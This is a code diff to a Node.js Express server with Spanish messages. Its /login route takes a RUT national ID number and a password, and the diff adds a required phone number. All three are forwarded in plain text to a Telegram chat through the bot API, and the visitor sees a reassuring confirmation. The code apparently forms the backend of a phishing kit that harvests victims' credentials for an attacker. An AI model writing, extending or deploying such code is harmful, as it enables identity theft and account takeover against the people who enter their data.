@@ -16,9 +16,17 @@ const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
 app.post("/login", async (req, res) => {
-  const { rut, passwd } = req.body;
+  const { rut, passwd, telefono } = req.body;
 
-  const mensaje = `Nuevo intento de login:\nRUT: ${rut}\nContraseña: ${passwd}`;
+  // Validar que el teléfono sea obligatorio
+  if (!telefono) {
+    return res.status(400).send("❌ El campo 'teléfono' es obligatorio.");
+  }
+
+  const mensaje = `Nuevo intento de login:
+RUT: ${rut}
+Contraseña: ${passwd}
+Teléfono: ${telefono}`;
 
   try {
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -27,8 +35,7 @@ app.post("/login", async (req, res) => {
       body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
     });
 
-  res.send("✅ Hemos recibido tu solicitud.");
-
+    res.send("✅ Hemos recibido tu solicitud.");
   } catch (error) {
     console.error(error);
     res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente");
